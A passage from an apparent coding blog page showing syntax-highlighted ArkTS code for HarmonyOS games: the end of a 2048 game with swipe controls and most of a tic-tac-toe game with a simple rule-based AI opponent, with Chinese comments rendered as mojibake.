&#125;) &#123;</span><br><span class="line">        <span class="comment">// éå†æ¯ä¸ªå•å…ƒæ ¼</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">board</span>.<span class="title function_">flat</span>(), <span class="function">(<span class="params">cell: Cell, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼ä¸Šçš„æ•°å­—</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;cell.value || <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>px`</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>px`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>px`</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;cell.value &gt;= <span class="number">100</span> ? <span class="variable language_">this</span>.cellSize / <span class="number">3</span> : <span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>px`</span>) <span class="comment">// æ ¹æ®æ•°å­—å¤§å°è°ƒæ•´å­—ä½“å¤§å°</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">colors</span>[cell.<span class="property">value</span> == <span class="number">0</span>?<span class="number">0</span>:<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">log2</span>(cell.<span class="property">value</span>))]) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(cell.<span class="property">value</span> === <span class="number">0</span> ? <span class="string">&#x27;#000&#x27;</span> : <span class="string">&#x27;#fff&#x27;</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// åœ†è§’</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellMargin * <span class="number">2</span>) * <span class="number">4</span>&#125;</span>px`</span>) <span class="comment">// è®¾ç½®å®¹å™¨å®½åº¦</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// é‡æ–°å¼€å§‹æŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">aboutToAppear</span>(); <span class="comment">// é‡æ–°å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">onTouch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Down</span> &amp;&amp; e.<span class="property">touches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// è§¦æ‘¸å¼€å§‹ï¼Œè®°å½•åˆå§‹ä½ç½®</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartX</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartY</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Up</span> &amp;&amp; e.<span class="property">changedTouches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// å½“æ‰‹æŒ‡æŠ¬èµ·æ—¶ï¼Œæ›´æ–°æœ€åçš„ä½ç½®</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenX</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenY</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">gesture</span>(</span><br><span class="line">      <span class="title class_">SwipeGesture</span>(&#123; <span class="attr">direction</span>: <span class="title class_">SwipeDirection</span>.<span class="property">All</span> &#125;) <span class="comment">// æ”¯æŒæ–¹å‘ä¸­ allå¯ä»¥æ˜¯ä¸Šä¸‹å·¦å³</span></span><br><span class="line">        .<span class="title function_">onAction</span>(<span class="function">(<span class="params">_event: GestureEvent</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> swipeX = <span class="variable language_">this</span>.<span class="property">lastScreenX</span> - <span class="variable language_">this</span>.<span class="property">screenStartX</span>;</span><br><span class="line">          <span class="keyword">const</span> swipeY = <span class="variable language_">this</span>.<span class="property">lastScreenY</span> - <span class="variable language_">this</span>.<span class="property">screenStartY</span>;</span><br><span class="line">          <span class="comment">// æ¸…é™¤å¼€å§‹ä½ç½®è®°å½•ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡æ»‘åŠ¨åˆ¤æ–­</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartX</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartY</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeX) &gt; <span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeY)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeX &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideRight</span>(); <span class="comment">// å‘å³æ»‘åŠ¨</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideLeft</span>(); <span class="comment">// å‘å·¦æ»‘åŠ¨</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeY &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideDown</span>(); <span class="comment">// å‘ä¸‹æ»‘åŠ¨</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">slideUp</span>(); <span class="comment">// å‘ä¸Šæ»‘åŠ¨</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">addRandomTiles</span>(<span class="number">1</span>); <span class="comment">// æ·»åŠ ä¸€ä¸ªéšæœºæ–¹å—</span></span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Xâœ”"><a href="#Xâœ”" class="headerlink" title="Xâœ”"></a>Xâœ”</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> winningLines = [</span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>], <span class="comment">// Horizontal 1</span></span><br><span class="line">  [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>], <span class="comment">// Horizontal 2</span></span><br><span class="line">  [<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>], <span class="comment">// Horizontal 3</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>], <span class="comment">// Vertical 1</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>], <span class="comment">// Vertical 2</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>], <span class="comment">// Vertical 3</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>], <span class="comment">// Diagonal \</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>]<span class="comment">// Diagonal /</span></span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GridCell</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// å½“å‰æ ¼å­çš„å€¼</span></span><br><span class="line">  <span class="attr">rowIndex</span>: number = <span class="number">0</span>; <span class="comment">// æ ¼å­æ‰€åœ¨çš„è¡Œå·</span></span><br><span class="line">  <span class="attr">colIndex</span>: number = <span class="number">0</span>; <span class="comment">// æ ¼å­æ‰€åœ¨çš„åˆ—å·</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">rowIndex: number, colIndex: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rowIndex</span> = rowIndex;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">colIndex</span> = colIndex;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">TicTacToe</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">board</span>: <span class="title class_">GridCell</span>[][] = []; <span class="comment">// æ¸¸æˆæ¿</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentPlayer</span>: string = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// å½“å‰ç©å®¶</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isGameOver</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ¸¸æˆæ˜¯å¦ç»“æŸ</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">winner</span>: string = <span class="string">&#x27;&#x27;</span>; <span class="comment">// è·èƒœè€…</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">120</span>; <span class="comment">// å•å…ƒæ ¼å¤§å°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellMargin</span>: number = <span class="number">5</span>; <span class="comment">// å•å…ƒæ ¼è¾¹è·</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç»„ä»¶å³å°†å‡ºç°æ—¶åˆå§‹åŒ–æ¸¸æˆ</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">board</span> = [</span><br><span class="line">      [<span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">0</span>, <span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">0</span>, <span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">0</span>, <span class="number">2</span>)],</span><br><span class="line">      [<span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">1</span>, <span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">1</span>, <span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">1</span>, <span class="number">2</span>)],</span><br><span class="line">      [<span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">2</span>, <span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">2</span>, <span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">2</span>, <span class="number">2</span>)]</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initGame</span>(); <span class="comment">// åˆå§‹åŒ–æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// é‡ç½®æ¸¸æˆçŠ¶æ€</span></span><br><span class="line">  <span class="title function_">initGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[i][j].<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ¸…ç©ºæ‰€æœ‰å•å…ƒæ ¼</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentPlayer</span> = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// è®¾ç½®å½“å‰ç©å®¶ä¸ºX</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">false</span>; <span class="comment">// æ¸¸æˆæœªç»“æŸ</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">winner</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ— è·èƒœè€…</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰ç©å®¶è·èƒœ</span></span><br><span class="line">  <span class="title function_">checkForWinner</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> winningLines) &#123; <span class="comment">// éå†æ‰€æœ‰èƒœåˆ©çº¿è·¯</span></span><br><span class="line">      <span class="keyword">const</span> mark = <span class="variable language_">this</span>.<span class="property">board</span>[line[<span class="number">0</span>]][line[<span class="number">1</span>]].<span class="property">value</span>;</span><br><span class="line">      <span class="keyword">if</span> (mark &amp;&amp; <span class="comment">// å¦‚æœæœ‰æ ‡è®°</span></span><br><span class="line">        mark === <span class="variable language_">this</span>.<span class="property">board</span>[line[<span class="number">2</span>]][line[<span class="number">3</span>]].<span class="property">value</span> &amp;&amp; <span class="comment">// å¹¶ä¸”ç­‰äºåŒä¸€è¡Œçš„ä¸‹ä¸€ä¸ªæ ‡è®°</span></span><br><span class="line">        mark === <span class="variable language_">this</span>.<span class="property">board</span>[line[<span class="number">4</span>]][line[<span class="number">5</span>]].<span class="property">value</span>) &#123; <span class="comment">// å†æ¬¡ç­‰äºåŒä¸€è¡Œçš„ä¸‹ä¸€ä¸ªæ ‡è®°</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>; <span class="comment">// æ¸¸æˆç»“æŸ</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">winner</span> = mark; <span class="comment">// è®¾ç½®è·èƒœè€…</span></span><br><span class="line">        <span class="keyword">return</span> mark; <span class="comment">// è¿”å›è·èƒœè€…çš„æ ‡è®°</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> allCellsFilled = <span class="variable language_">this</span>.<span class="property">board</span>.<span class="title function_">flat</span>().<span class="title function_">every</span>(<span class="function"><span class="params">cell</span> =&gt;</span> cell.<span class="property">value</span> !== <span class="string">&#x27;&#x27;</span>); <span class="comment">// æ£€æŸ¥æ‰€æœ‰å•å…ƒæ ¼æ˜¯å¦å·²å¡«æ»¡</span></span><br><span class="line">    <span class="keyword">if</span> (allCellsFilled) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>; <span class="comment">// æ¸¸æˆç»“æŸ</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">winner</span> = <span class="string">&#x27;å¹³å±€&#x27;</span>; <span class="comment">// è®¾ç½®ä¸ºå¹³å±€</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;å¹³å±€&#x27;</span>; <span class="comment">// è¿”å›å¹³å±€æ ‡è¯†</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ— è·èƒœè€…</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç©å®¶è½å­</span></span><br><span class="line">  <span class="title function_">placeMark</span>(<span class="params">rowIndex: number, colIndex: number</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isGameOver</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">board</span>[rowIndex][colIndex].<span class="property">value</span> === <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// å¦‚æœæ¸¸æˆæœªç»“æŸä¸”å•å…ƒæ ¼ä¸ºç©º</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">board</span>[rowIndex][colIndex].<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">currentPlayer</span>; <span class="comment">// æ”¾ç½®æ ‡è®°</span></span><br><span class="line">      <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">checkForWinner</span>(); <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰è·èƒœè€…</span></span><br><span class="line">      <span class="keyword">if</span> (result) &#123; <span class="comment">// å¦‚æœæœ‰è·èƒœè€…</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`<span class="subst">$&#123;result&#125;</span> è·èƒœï¼`</span>);</span><br><span class="line">        <span class="keyword">let</span> message = <span class="string">`<span class="subst">$&#123;result&#125;</span> è·èƒœï¼`</span>; <span class="comment">// è®¾ç½®æç¤ºä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span> (result === <span class="string">&#x27;å¹³å±€&#x27;</span>) &#123;</span><br><span class="line">          message = <span class="string">&#x27;å¹³å±€ï¼&#x27;</span>; <span class="comment">// å¦‚æœæ˜¯å¹³å±€</span></span><br><span class="line">        &#125;</span><br><span class="line">        promptAction.<span class="title function_">showDialog</span>(&#123; <span class="comment">// æ˜¾ç¤ºå¯¹è¯æ¡†</span></span><br><span class="line">          <span class="attr">title</span>: <span class="string">`æ¸¸æˆç»“æŸ`</span>, <span class="comment">// æ ‡é¢˜</span></span><br><span class="line">          message, <span class="comment">// æç¤ºä¿¡æ¯</span></span><br><span class="line">          <span class="attr">buttons</span>: [ <span class="comment">// æŒ‰é’®</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>, <span class="comment">// æ–‡æœ¬</span></span><br><span class="line">              <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> <span class="comment">// é¢œè‰²</span></span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initGame</span>(); <span class="comment">// é‡æ–°å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦‚æœæ²¡æœ‰è·èƒœè€…</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">currentPlayer</span> = <span class="variable language_">this</span>.<span class="property">currentPlayer</span> === <span class="string">&#x27;X&#x27;</span> ? <span class="string">&#x27;O&#x27;</span> : <span class="string">&#x27;X&#x27;</span>; <span class="comment">// åˆ‡æ¢ç©å®¶</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentPlayer</span> === <span class="string">&#x27;O&#x27;</span>) &#123; <span class="comment">// å¦‚æœæ˜¯AIç©å®¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">aiMove</span>(); <span class="comment">// AIè½å­</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// AIè½å­</span></span><br><span class="line">  <span class="title function_">aiMove</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> moveFound = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">bestMove</span>: <span class="literal">null</span> | number[] = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// å¯»æ‰¾æœ€ä½³è½å­ä½ç½®</span></span><br><span class="line">    bestMove = <span class="variable language_">this</span>.<span class="title function_">findWinningMove</span>(<span class="string">&#x27;O&#x27;</span>); <span class="comment">// æ£€æŸ¥AIæ˜¯å¦æœ‰èƒœåˆ©æœºä¼š</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove a:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (bestMove) &#123;</span><br><span class="line">      moveFound = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      bestMove = <span class="variable language_">this</span>.<span class="title function_">findWinningMove</span>(<span class="string">&#x27;X&#x27;</span>); <span class="comment">// æ£€æŸ¥ç©å®¶æ˜¯å¦æœ‰èƒœåˆ©æœºä¼š</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove b:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">if</span> (bestMove) &#123;</span><br><span class="line">        moveFound = <span class="literal">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bestMove = <span class="variable language_">this</span>.<span class="title function_">findRandomMove</span>(); <span class="comment">// éšæœºè½å­</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove c:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">if</span> (bestMove) &#123;</span><br><span class="line">          moveFound = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (moveFound &amp;&amp; bestMove) &#123; <span class="comment">// å¦‚æœæ‰¾åˆ°äº†åˆé€‚çš„è½å­ä½ç½®</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">placeMark</span>(bestMove[<span class="number">0</span>], bestMove[<span class="number">1</span>]); <span class="comment">// è½å­</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¯»æ‰¾ç»™å®šç©å®¶æ˜¯å¦æœ‰æœºä¼šèµ¢ï¼Œå¹¶è¿”å›è¿™æ ·çš„ç§»åŠ¨ä½ç½®</span></span><br><span class="line">  <span class="title function_">findWinningMove</span>(<span class="params">player: string</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> winningLines) &#123; <span class="comment">// éå†æ‰€æœ‰èƒœåˆ©çº¿è·¯</span></span><br><span class="line">      <span class="keyword">let</span> missingIndex = -<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> noEmptyCount = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; line.<span class="property">length</span>; i += <span class="number">2</span>) &#123; <span class="comment">// æ£€æŸ¥æ¯ä¸ªå•å…ƒæ 